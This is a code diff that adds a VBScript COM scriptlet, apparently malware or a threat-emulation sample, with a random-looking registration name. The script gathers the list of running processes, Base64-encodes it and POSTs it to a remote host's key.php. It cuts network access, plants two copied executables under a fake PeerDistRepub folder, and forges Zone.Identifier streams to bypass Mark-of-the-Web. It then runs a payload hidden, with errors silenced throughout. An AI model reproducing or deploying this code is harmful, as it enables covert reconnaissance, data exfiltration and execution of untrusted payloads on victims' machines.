@@ -1,0 +1,111 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="fjzmpcjvqp"
+    progid="fjzmpcjvqp"
+    version="1.00"
+    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
+    remotable="true"
+	>
+</registration>
+
+<script language="VBScript">
+<![CDATA[
+
+	On Error Resume Next
+	
+	Function Base64Encode(sText)
+		Dim oXML, oNode
+
+		Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+		Set oNode = oXML.CreateElement("base64")
+		oNode.dataType = "bin.base64"
+		oNode.nodeTypedValue =Stream_StringToBinary(sText)
+		Base64Encode = oNode.text
+		Set oNode = Nothing
+		Set oXML = Nothing
+	End Function
+
+	Function Stream_StringToBinary(Text)
+		Const adTypeText = 2
+		Const adTypeBinary = 1	
+		Dim BinaryStream 'As New Stream
+		Set BinaryStream = CreateObject("ADODB.Stream")	
+		BinaryStream.Type = adTypeText
+		BinaryStream.CharSet = "us-ascii"
+		BinaryStream.Open
+		BinaryStream.WriteText Text
+		BinaryStream.Position = 0
+		BinaryStream.Type = adTypeBinary	
+		BinaryStream.Position = 0	
+		Stream_StringToBinary = BinaryStream.Read
+		Set BinaryStream = Nothing
+	End Function
+
+	Dim xmlHttp
+	Dim objWMIService, objProcess, colProcess
+	Dim strComputer, strList
+	Dim aconf
+
+    WScript.Sleep(10000)
+	
+	strComputer = "."
+	Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+
+	Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process")
+
+	For Each objProcess in colProcess
+		strList = strList + " " + objProcess.Name
+	Next
+	
+	Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
+
+	xmlHttp.Open "POST", "http://192.168.40.128/cta/key.php", False
+	xmlHttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	xmlHttp.send "L=G641giQQOWUiXE&q=" + Base64Encode(strList)
+	Set xmlHttp = Nothing
+
+    Const qgkao = """"
+    Set wShell = CreateObject("WScript.Shell")
+    Set shellEnv = wShell.Environment("Process")
+    envTemp = shellEnv("TEMP")
+    envLocalAppData = shellEnv("LOCALAPPDATA")
+    envAppData = shellEnv("APPDATA")
+
+    StartupPath = envAppData & "\mIcrOsoft\winDows\starT meNu\progRams\startup\"
+    peerdistPath = envLocalAppData & "\PeerDistRepub\"
+    Set fxo = CreateObject("Scripting.FileSystemObject")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set aconf = GetObject("winmgmts:Win32_NetworkAdapterConfiguration")
+    
+    If Not fxo.FolderExists(peerdistPath) Then
+        fxo.CreateFolder peerdistPath
+    End If
+    
+    If Not fxo.FileExists(peerdistPath & "msrvcd32.exe") Then
+        RetVal = aconf.ReleaseDHCPLeaseAll
+        
+        fxo.CopyFile envTemp & "\p", peerdistPath & "SharpQQ3104.exe", True
+        fxo.CopyFile envTemp & "\b", peerdistPath & "SharpQQ2688.exe", True
+        
+        Set f1 = fso.CreateTextFile(peerdistPath & "SharpQQ3104.exe:Zone.Identifier", True)
+        f1.WriteLine "[ZoneTransfer]" & vbNewLine & "ZoneId=1"
+        f1.Close
+        
+        Set f2 = fso.CreateTextFile(peerdistPath & "SharpQQ2688.exe:Zone.Identifier", True)
+        f2.WriteLine "[ZoneTransfer]" & vbNewLine & "ZoneId=1"
+        f2.Close
+
+        intReturn = wShell.Run(peerdistPath & "SharpQQ3104.exe", 0, True)
+        intReturn = wShell.Run("cmd /cipconfig /renew", 0, True)
+        
+    End If
+        
+    Set wShell = Nothing
+    Set aconf = Nothing
+		
+]]>
+</script>
+
+</scriptlet>
